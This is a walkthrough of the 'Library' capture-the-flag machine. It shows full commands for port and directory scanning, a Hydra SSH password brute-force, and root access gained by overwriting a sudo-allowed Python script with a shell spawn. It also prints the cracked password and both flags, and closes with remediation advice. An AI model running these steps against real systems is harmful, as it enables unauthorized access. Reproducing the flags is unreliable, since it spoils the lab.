# Library CTF Walkthrough

## Overview
Library is a Capture The Flag (CTF) machine designed to practice penetration testing skills. The goal is to gain root access and retrieve both user and root flags. This walkthrough documents the steps taken to compromise the machine.

**Machine IP:** 10.10.218.43  
**Difficulty:** Easy  
**Tags:** SSH, Web, Brute-Force, Privilege Escalation, Sudo Misconfiguration

---

## Reconnaissance

### Nmap Scan
```bash
nmap -A 10.10.218.43
```

**Findings:**
- **Port 22/tcp:** OpenSSH 7.2p2 Ubuntu
- **Port 80/tcp:** Apache httpd 2.4.18 (Ubuntu)
- **OS:** Linux 4.4

### Gobuster Directory Enumeration
```bash
gobuster dir -u http://10.10.218.43/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js -t 50
```

**Key Findings:**
- `robots.txt` contains:
  ```
  User-agent: rockyou
  Disallow: /
  ```
- `index.html` reveals a username: `meliodas`

---

## Initial Access

### SSH Brute-Force with Hydra
Using the username `meliodas` and the `rockyou.txt` wordlist:
```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.218.43 -t 4
```

**Result:**  
Password found: `iloveyou1`

### SSH Login
```bash
ssh meliodas@10.10.218.43
```

### User Flag
Located at `/home/meliodas/user.txt`:  
`6d488cbb3f111d135722c33cb635f4ec`

---

## Privilege Escalation

### Enumeration
- Discovered `bak.py` in `/home/meliodas/` (owned by root):
  ```python
  #!/usr/bin/env python
  import os
  import zipfile

  def zipdir(path, ziph):
      for root, dirs, files in os.walk(path):
          for file in files:
              ziph.write(os.path.join(root, file))

  if __name__ == '__main__':
      zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
      zipdir('/var/www/html', zipf)
      zipf.close()
  ```

- Checked sudo permissions:
  ```bash
  sudo -l
  ```
  **Output:**
  ```
  User meliodas may run the following commands on ubuntu:
      (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
  ```

### Exploitation
1. Removed the original `bak.py` (writable home directory):
   ```bash
   rm bak.py
   ```

2. Created a malicious `bak.py`:
   ```bash
   echo 'import os; os.system("/bin/bash")' > bak.py
   ```

3. Executed with sudo to gain root shell:
   ```bash
   sudo /usr/bin/python3 /home/meliodas/bak.py
   ```

### Root Flag
Located at `/root/root.txt`:  
`e8c8c6c256c35515d1d344ee0488c617`

---

## Key Takeaways
1. **Information Disclosure:** `robots.txt` and `index.html` leaked critical hints (username and wordlist).
2. **Brute-Force Protection:** Use strong passwords to prevent SSH brute-forcing.
3. **Sudo Misconfiguration:** Restrict sudo permissions to prevent arbitrary code execution.

---

## Remediation
- Use strong, unique passwords for SSH.
- Avoid disclosing usernames in web content.
- Restrict sudo permissions to specific commands without wildcards.
- Regularly audit sudo rules and file permissions.

---

## Tools Used
- Nmap
- Gobuster
- Hydra
- SSH

---

## References
- [Rockyou Wordlist](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)

---

**Author:** Goodluck Oyebisi  
**Date:** September 1, 2025  

